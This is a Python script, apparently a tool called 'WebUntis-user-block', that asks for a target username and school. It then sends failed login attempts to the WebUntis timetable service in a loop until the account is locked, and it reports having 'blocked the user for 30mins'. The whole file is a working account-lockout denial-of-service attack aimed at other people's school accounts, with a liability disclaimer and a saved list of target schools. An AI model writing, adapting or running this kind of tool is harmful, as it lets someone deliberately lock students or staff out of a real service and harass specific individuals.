"""importing Modules"""
import json
import os
import re
import sys

import validators
from bs4 import BeautifulSoup
from requests_html import HTMLSession


class WebUntis():
    """class"""
    def __init__(self) -> None:
        self.url = "https://aoide.webuntis.com/WebUntis/j_spring_security_check"
        self.logurl = "https://aoide.webuntis.com/WebUntis/"
        self.attempts = 0
        self.payload = {
            'school': 'htbla-weiz',
            'j_username': 'user',
            'j_password': 'password',
            'token': ''
        }

    def main(self):
        """sends request to server and get responce"""
        print("""
 __    __     _                 _   _                                    _     _            _     
/ / /\ \ \___| |__  /\ /\ _ __ | |_(_)___       _   _ ___  ___ _ __     | |__ | | ___   ___| | __ 
\ \/  \/ / _ \ '_ \/ / \ \ '_ \| __| / __|_____| | | / __|/ _ \ '__|____| '_ \| |/ _ \ / __| |/ / 
 \  /\  /  __/ |_) \ \_/ / | | | |_| \__ \_____| |_| \__ \  __/ | |_____| |_) | | (_) | (__|   <  
  \/  \/ \___|_.__/ \___/|_| |_|\__|_|___/      \__,_|___/\___|_|       |_.__/|_|\___/ \___|_|\_\  by Pfefan

        """)

        if os.path.isfile("tos.dat") is False:
            open('tos.dat', 'w+')
        with open("tos.dat", "r+", encoding="utf8") as file:
            if file.read() == "True":
                pass
            elif file.read() == "":
                i = input("I accept no liability for any property damage or personal injury caused by this program, agree y/n: ")
                if i == "y":
                    file.write("True")
                else:
                    sys.exit()

        user = input("Enter a user: ")
        school = ""
        validinput = False
        schools = ""
        schoollist = []

        # get save school id's from file
        if os.path.isfile("school.dat") is False:
            open('school.dat', 'w+')
        with open("school.dat", "r+") as file:
            lines = file.readlines()
            if len(lines) > 0:
                counter = 1
                schools = "\n"
                for line in lines:
                    schools += f"{counter}. {line}"
                    schoollist.append(line)
                    counter += 1
                schools += "\n --> "

        while validinput is False:
            school_input = input("Enter school login url or enter id of saved schools: " + schools)

            if validators.url(school_input) is True:
                try:
                    school_input = school_input.split('/')[4]
                    school = school_input.split("=")[1][:-1]
                    validinput = True
                except IndexError:
                    validinput = False
            elif self.checkforint(school_input) is True:
                school = schoollist[int(school_input) - 1]
                validinput = True
            else:
                school = school_input

            if school not in schoollist:
                with open("school.dat", "a", encoding="utf8") as file:
                    if len(schoollist) > 0:
                        file.write("\n" + school)
                    else:
                        file.write(school)

        self.payload["j_username"] = user
        self.payload["school"] = school

        while True:
            session = HTMLSession()
            session.post(self.url, data=self.payload)
            page = session.get(self.logurl)
            soup = BeautifulSoup(page.content, 'html.parser')

            results = soup.find('script')
            stringtext = results.get_text()
            array = stringtext.split(';')
            untis = array[3].strip()
            untis = re.sub("\s\s+"," ", untis)
            untis = untis[18:-6].split(',"lastUserName"')[0] +"}}"
            structjson = json.loads(untis)
            self.attempts += 1

            print(f"attempts: {self.attempts}", end="\r")
            if structjson["loginServiceConfig"]["loginError"] != "Invalid user name and/or password":
                print("successfully blocked the user for 30mins")
                break

    def checkforint(self, value):
        try:
            int(value)
            return True
        except ValueError:
            return False


WebUntis().main()
